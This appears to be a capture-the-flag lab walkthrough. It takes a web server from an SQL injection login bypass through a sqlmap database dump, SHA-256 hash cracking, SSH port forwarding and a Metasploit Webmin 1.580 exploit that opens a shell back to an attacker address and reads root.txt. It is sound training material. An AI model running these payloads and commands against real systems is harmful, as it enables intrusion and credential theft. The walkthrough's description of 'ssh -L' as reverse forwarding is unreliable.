@@ -1,0 +1,42 @@
+Browse to the web server.
+
+There is a picture of a man with a sniper rifle on the front page.
+
+Snip a picture, and throw it into google reverse image search, to find out it is Agent 47
+
+Next, input ' or 1=1 -- - into the username field to login. Keep the password field blank
+
+Intercept a post request when inputing something into the search bar here.
+
+Copy and paste what burp presents into a .txt file and use the following command to dump the database:
+	sqlmap -r info.txt --dbms=mysql --dump
+
+Take the hash and throw it in a txt file
+
+Give it to John with the --format=Raw-SHA256 flag
+
+Now with a username and password, use ssh
+
+ssh -L 10000:localhost:10000 <username>@<ip>
+	This will start reverse ssh port forwarding and unblock port 10000
+
+Now you can browse to localhost:10000 and sign in with the credentials
+
+After some looking around, you see this server is running Webmin 1.580
+
+Take a look at https://www.exploit-db.com/exploits/21851 for more details on the vulnerability
+
+I did the following in msf console
+	search webm
+	use 8
+	set username: agent47
+	set password: videogamer124
+	set rhosts: 127.0.0.1
+	set ssl false
+	set lhost 10.6.24.197
+	set payload 7
+
+
+Type in run, and you should pop a shell
+
+Browse to /root and cat out the root.txt file
